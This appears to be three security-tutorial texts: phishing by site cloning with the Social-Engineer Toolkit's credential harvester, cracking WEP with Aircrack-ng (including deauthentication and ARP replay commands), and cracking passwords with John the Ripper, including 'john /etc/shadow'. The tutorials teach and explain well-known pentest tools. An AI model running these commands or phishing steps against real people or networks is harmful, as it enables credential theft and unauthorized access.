                content: "Website cloning and credential harvesting are two essential techniques in the arsenal of social engineers. These techniques involve creating a replica of a legitimate website and tricking users into entering their sensitive information on the fake website, such as usernames and passwords.\nThis information can then be used for various malicious activities, including unauthorized access to user accounts, identity theft, or even corporate espionage.\nClone Site linkBefore setting up a cloned site in SET, you need to enable the Apache web server in the SET configuration file located at /etc/setoolkit/set.config. Change the line APACHE_SERVER=OFF to APACHE_SERVER=ON, save the file, and restart SET to apply the changes.\nTo use the Site Cloner in SET, follow these steps:\nLaunch SET by running setoolkit in the terminal. Select option one, which is Social-Engineering Attacks. Choose option two, Website Attack Vectors. Select option three, Credential Harvester Attack Method. Choose option two, Site Cloner. After that:\nEnter the IP address of the machine running SET, which will be used as the redirect IP for captured credentials. Input the URL of the target website you want to clone (e.g., https://www.github.com/login). SET will now clone the website and host it on your machine, with a phishing page to capture user credentials.\nFor this to work effectively, you need to clone a site that has the username and password fields on the same page.\nCredential Harvesting linkWhen users visit the cloned website and enter their login information, the credentials will be captured and sent to the attacker’s machine. This information can then be used to gain unauthorized access to the user’s account on a legitimate website.\nThe user will then be redirected to the actual login page of the service.\nIf we head back to our terminal in Kali, we should see the credentials come through.\nTo make the cloned website more convincing, attackers often employ tactics like typosquatting (registering domains with similar names to the target site), such as amzon.com (instead of amazon.com), or using the target site’s name as a subdomain of another legitimate site they control (amazon.myfakesite.com).\nThese techniques help create a sense of credibility for the fake website, increasing the chances of successfully tricking users into revealing their credentials.\nIt’s important to note that tools like SET can quickly deploy cloned websites on cloud platforms like AWS, complete with public URLs, making it even easier for attackers to create convincing phishing campaigns.\n"

For additional information, be prepared to conduct your own research. The Forum and Wiki offer extensive supplementary tutorials and information.\nFor detailed steps on using Aircrack-ng, refer to the Simple WEP Crack tutorial, which covers the actual Aircrack-ng steps in greater detail.\nSetting Up Hardware and Installing Aircrack-ng linkTo use Aircrack-ng effectively on your Linux system, you must first patch and install the correct driver for your wireless card. Some cards support multiple drivers, but only certain ones provide the necessary features for Aircrack-ng.\nEnsure you have a wireless card compatible with the Aircrack-ng suite, one that can fully support packet injection. A compatible card can crack a wireless access point in under an hour. Refer to the hardware compatibility page to determine the category of your card. For further guidance, read the tutorial, “Is My Wireless Card Compatible?”\nFirst, identify the chipset in your wireless card and the appropriate driver. Use the drivers section to find the necessary drivers.\nInstalling Aircrack-ng linkDownload the latest version of Aircrack-ng from the homepage, use provided packages, or use a penetration testing distribution like Kali Linux or Pentoo where Aircrack-ng is pre-installed and up-to-date. Follow the documentation on the installation page for detailed installation steps.\nIEEE 802.11 Basics linkBefore diving into action, it’s essential to understand how wireless networks operate. This knowledge will help troubleshoot issues and describe problems accurately for further assistance. Though scientific, this section is crucial for successfully cracking wireless networks.\nHow a Wireless Network Is Found linkManaged networks with Access Points (AP) periodically send out beacon frames containing information like:\nNetwork name (ESSID) Encryption status and type Supported data rates Channel number This information is visible in tools that connect to the network or when scanning for networks with iwlist scan and airodump-ng. Each AP has a unique MAC address used for communication, much like a unique name.\nConnecting to a Network linkTo connect to a wireless network, Open System Authentication is commonly used. The process involves:\nRequesting authentication from the AP. AP responds with authentication approval. Requesting association with the AP. AP responds with connection approval. Problems may arise if:\nWPA/WPA2 is used, requiring EAPOL authentication. The AP has MAC filtering enabled. Shared Key Authentication is used, requiring the correct WEP key. Simple Sniffing and Cracking linkDiscovering Networks linkFirst, identify potential targets using airodump-ng or tools like Kismet. Put your wireless card into monitor mode with:\nairmon-ng start wlan0 This creates a new interface, wlan0mon. Verify the mode with iwconfig. Then, start airodump-ng to scan for networks:\nairodump-ng wlan0mon If airodump-ng could connect to the WLAN device, you’ll see a screen like this:\n—image\nairodump-ng hops from channel to channel and shows all access points it can receive beacons from. Channels 1 to 14 are used for 802.11b and g (in US, they only are allowed to use 1 to 11; 1 to 13 in Europe with some special cases; 1-14 in Japan). 802.11a is in the 5GHz and availability in different countries is more fragmented than on 2.4GHz. In general, known channels starts at 36 (32 in some countries) to 64 (68 in some countries) and 96 to 165. Wikipedia has more details on channel availability. The Linux Central Regulatory Domain Agent takes care of allowing/forbidding transmissions on the different channels for your country; however, it needs to be set appropriately.\nThe current channel is shown in the top left corner.\nAfter a short time some APs and (hopefully) some associated clients will show up.\nSniffing IVs linkTo capture all packets from your target network, tune to a specific channel and save data with:\nairodump-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0mon Capture between 40,000 and 85,000 Initialization Vectors (IVs) for successful WEP cracking. This can be expedited with packet replay attacks.\nCracking WEP linkOnce enough IVs are captured, crack the WEP key with:\naircrack-ng -b 00:01:02:03:04:05 dump-01.cap Adjust parameters as needed based on the number of IVs and the specific scenario.\nActive Attacks linkInjection Support linkMost devices require patched drivers for packet injection. Some only support certain attacks. Take a look at the compatibility page, column aireplay. Sometimes this table is not up-to-date, so if you see a “NO” for your driver there don’t give up yet, but look at the driver homepage, the driver mailing list or our Forum. If you were able to successfully replay using a driver which is not listed as supported, don’t hesitate to update the compatibility page table and add a link to a short howto. (To do this, request a wiki account on IRC.)\nThe first step is to make sure packet injection really works with your card and driver. The easiest way to test it is the injection test attack. Make sure to perform this test prior to proceeding. Your card must be able to successfully inject in order to perform the following steps.\nYou’ll need the BSSID (AP MAC) and ESSID (network name) of an AP that does not do MAC filtering (e.g. your own) and must be in range of the AP.\nTry connecting to your AP using airplay-ng:\naireplay-ng --fakeauth 0 -e \"your network ESSID\" -a 00:01:02:03:04:05 wlan0mon The value after -a is the BSSID of your AP.\nIf injection works you should see something like this:\n12:14:06 Sending Authentication Request 12:14:06 Authentication successful 12:14:06 Sending Association Request 12:14:07 Association successful :-) If not\ndouble-check ESSID and BSSID make sure your AP has MAC filtering disabled test it against another AP make sure your driver is properly patched and supported Instead of “0”, try “6000 -o 1 -q 10”\nARP Replay linkThe lazy way linkFirst open a window with an airodump-ng sniffing for traffic (see above). aireplay-ng and airodump-ng can run together. Wait for a client to show up on the target network. Then start the attack:\naireplay-ng --arpreplay -b 00:01:02:03:04:05 -h 00:04:05:06:07:08 wlan0mon -b specifies the target BSSID, -h the MAC of the connected client.\nNow you have to wait for an ARP packet to arrive. Usually you’ll have to wait for a few minutes (or look at the next chapter).\nIf you were successful, you’ll see something like this:\nSaving ARP requests in replay_arp-0627-121526.cap You must also start airodump to capture replies. Read 2493 packets (got 1 ARP requests), sent 1305 packets... If you have to stop replaying, you don’t have to wait for the next ARP packet to show up, but you can re-use the previously captured packet(s) with the -r option.\nWhen using the ARP injection technique, you can use the PTW method to crack the WEP key. This dramatically reduces the number of data packets you need and also the time needed. You must capture the full packet in airodump-ng, meaning do not use the “–ivs” option when starting it. For aircrack-ng, use “aircrack -z ”. (PTW is the default attack)\nIf the number of data packets received by airodump-ng sometimes stops increasing you maybe have to reduce the replay-rate. You do this with the -x option. I usually start out with 50 and reduce until packets are received continuously again. Better positioning of your antenna usually also helps.\nThe aggressive way linkMost operating systems clear the ARP cache on disconnection. If they want to send the next packet after reconnection (or just use DHCP), they have to send out ARP requests. So the idea is to disconnect a client and force it to reconnect to capture an ARP-request. A side-effect is that you can sniff the ESSID and possibly a keystream during reconnection too. This comes in handy if the ESSID of your target is hidden, or if it uses shared-key authentication.\nKeep your airodump-ng and aireplay-ng running. Open another window and run a deauthentication attack:\naireplay-ng --deauth 5 -a 00:01:02:03:04:05 -c 00:04:05:06:07:08 wlan0mon -a is the BSSID of the AP, -c the MAC of the targeted client.\nWait a few seconds and your ARP replay should start running.\nMost clients try to reconnect automatically. But the risk that someone recognizes this attack or at least attention is drawn to the stuff happening on the WLAN is higher than with other attacks.\nDeauthentication Attack linkForce a client to reconnect and capture ARP requests by running a deauthentication attack:\naireplay-ng --deauth 5 -a 00:01:02:03:04:05 -c 00:04:05:06:07:08 wlan0mon Conclusion linkThis guide provides a foundational understanding of using the Aircrack-ng suite for wireless network security testing. For more advanced techniques and detailed scenarios, consult the Forum, Wiki, and additional tutorials available online. Remember, successful cracking involves both knowledge and practice, so continue to explore and experiment within legal and ethical boundaries.\n"

As the name, It is used to crack password hashes by using its most popular inbuilt program, rules and codes that are also an individual password cracker itself in a single package.\nIt automatically detects types of password hashes, you can also customize this tool according to your wish. It can be used to crack password-protected compressed files like Zip, Rar, Doc, pdf etc.\nThe penetration testers, ethical hackers, security experts and other Cyber Security professionals use this tool to find weak algorithms and then make them strong so that they can’t be hacked.\nSecurity professionals build their confidential files with a strong hash algorithm to prevent external unauthorized access. Hackers used it to crack multiple accounts and simply crack their credentials. Security experts use it to strengthen their encryption. It can also be used for hacking shells and passwords SHA-crypt hashes It provides a mangling feature which is a preprocessor in JTR that optimizes the word list to make the password cracking process faster. Understanding Hash Functions linkHashing is the process of converting an input of any length into a fixed-size string of text using the mathematical function (Hash Function) i.e, any text no matter how long it is can be converted into any random combination of numbers and alphabets through an algorithm\nHash function example Let’s understand hashing process with a real-life example. The best example is how our system password stores in the database.\nWithout Hashing Algorithm linkWhenever you set a password it will directly store in the database as a text file that may be read easily if the system compromised. It will save your password in a plain file as the same string you entered. Check the below image with syntax and example\nWith Hashing Algorithm linkWhenever you set your password it will take your password as an input string and with the help of hashing function, it converts that password into a hash (random combination of number and alphabet) and stores it in the database. It enhances security by encrypting input strings. It will save your password in a different format so no one can read it even if your system compromise.\nTypes of Hashing Algorithms linkJohn the Ripper tool are able to perform various attacks and crack a lot of hash formats such as:\nMD2 CRC32 SHA-1 SHA-256 MD5 RipeMD128 Adler32 Tiger You can check the formats that supports with the following command on your terminal:\njohn --list=formats How JRP Works? linkThe main objective of John the Ripper is to crack the password. There are many ways that can be supported but it is mainly known for Dictionary attacks. However, you can also run other types of attacks like Bruteforce attack, Rainbow Table etc.\nDictionary attack: This is the popular and most usable attack in the JTR (John the Ripper) password cracker tool where we used pre-defined words or a list of words that can be used to crack the password. This attack uses the words from the wordlist (A text file having pre-defined words) and matches every single word from the list with a password to crack in sequence.\nBrute-force attack: If you are using this attack then you have to do the configuration of few things before its use such as the defining minimum and maximum lengths of the password, defining possible characters that you want to test during the cracking process like (special characters, alphabets and numbers).\nFor Example, The matching string that you are using for cracking passwords should include uppercase alphabets, special characters and numbers like ABC32@$\nThe user gets a password on the successful match, but this effective process is slow. for example, a 10-character password including upper and lower letters along with numbers and special characters will take over 10 years to be guessed by a computer\nGetting John The Ripper linkIt was developed for Unix Operating systems and was only work on Linux based systems but now available for all platforms such as Windows, BSD, Mac.\nIn Kali Linux John the Ripper is already available under password cracking metapackages, so you don’t need to download it.\nYou can download John the Ripper password cracker from the official website Openwall.\nIf you are using different Linux distributions like Ubuntu, Fedora, Arch etc. then you can install it by running the below single command the difference in command only will be the package manager i.e, for Ubuntu you use apt, Arch uses Pacman and Redhat uses yum.\nsudo apt-get install john How to Use John the Ripper linkUsing this password cracker tool is very easy and straightforward, you just need to type john followed by the hash file that you want to crack and then just define the format of the hash and hit enter.\njohn hash.txt --format=RAW-MD5 In the above picture, you can see lots of supported formats, You can do various things with this tool such as using wordlists, rules, modes, options, decrypting formats etc, We will see below how to use these various things in this tool\nCracking Zip File linkAssume you have a zip file that is password protected called protected.zip. We can use John The Ripper to crack the password. We first need to generate a hash of the zip file. You can use the below command and will generate the hash value into a hash.txt file.\nsudo zip2john protected.zip \u003e hash.txt So now we have a hash of our zip file that we will use to crack the password. In the below command we use the format option to specify the zip file and then the hash.txt file where we store our hash value.\nsudo john --format=zip hash.txt This should complete and return the password which you can then use to open the zip file.\nCracking MD5 Password linkIn this example I am generating a hash by using md5 hash generator to show you how to crack MD5 formatted files password. In the below image you can see I have generated the hash of the 12345 string. You can copy the MD5 hash to perform the same practical\nWe used the string 123456789. The MD5 hash is 25f9e794323b453885f5181f1b624d0b and the SHA1 f7c3bc1d808e04732adf679965ccc34ca7ae3441.\nNow you can create a .txt file and put the MD5 hash using the following commands.\nWe can now crack the password by running the following command\njohn hash.txt --format=RAW-MD5 You can see, we get the string back as 123456789.\nCracking Linux Password linkWhen we create a password of the Linux system it stores in /etc/shadow location in encrypted form i.e, like a hash. So cracking a Linux password is easy with just a single command that is given below.\nsudo john /etc/shadow Now we know what is John the Ripper, How to use John the Ripper, How John the Ripper password cracker works, How passwords can be cracked and also a tutorial on its real-life important uses, but this not get over yet there are lots of other things that can be done by JTR.\nRemenber if the password is long it will also take long time to crack.\n"
